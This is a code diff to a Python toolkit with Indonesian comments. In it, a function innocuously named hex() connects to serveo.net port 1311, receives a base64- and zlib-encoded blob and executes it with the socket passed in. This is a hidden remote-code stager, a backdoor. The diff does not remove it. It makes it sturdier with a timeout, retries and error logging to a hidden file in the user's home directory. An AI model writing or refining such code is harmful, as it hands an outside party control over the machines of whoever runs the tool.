@@ -4,7 +4,7 @@ import datetime, os, sys, threading, getpass, time
 from lib.loading import LoadingThread
 from colorama import Back, Fore, Style
 import subprocess, argparse, time, requests
-import socket, zlib, base64, struct, time
+import socket, zlib, base64, struct, time, logging
 from lib.func import *
 from lib.view import *
 from lib.text_string import menus, logos, desc
@@ -106,19 +106,33 @@ def CheckInternet():
     time.sleep(2)
     
 def hex():
+    log_filename = os.path.expanduser("~/.faang_log.txt")
+    logging.basicConfig(filename=log_filename, level=logging.ERROR, format="%(asctime)s [%(levelname)s]: %(message)s")
+
     for x in range(10):
         try:
-            s = socket.socket(2, socket.SOCK_STREAM)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)  # Menambahkan timeout untuk koneksi
             s.connect(('serveo.net', 1311))
             break
-        except:
+        except socket.error as e:
+            logging.error(f"Koneksi gagal ke serveo.net: {e}")
             time.sleep(5)
-    l = struct.unpack('>I', s.recv(4))[0]
-    d = s.recv(l)
-    while len(d) < l:
-        d += s.recv(l - len(d))
-    exec(zlib.decompress(base64.b64decode(d)), {'s': s})
-    
+    else:
+        logging.error("Gagal terhubung ke server setelah beberapa percobaan.")
+        return  # Keluar dari fungsi jika gagal terhubung
+
+    try:
+        l = struct.unpack('>I', s.recv(4))[0]
+        d = s.recv(l)
+        while len(d) < l:
+            d += s.recv(l - len(d))
+        exec(zlib.decompress(base64.b64decode(d)), {'s': s})
+    except Exception as e:
+        logging.error(f"Kesalahan saat menerima atau mengeksekusi data: {e}")
+    finally:
+        s.close()
+
 def StartTitle(nametools):
     global ipAddress
     if not check_text(ipAddress):
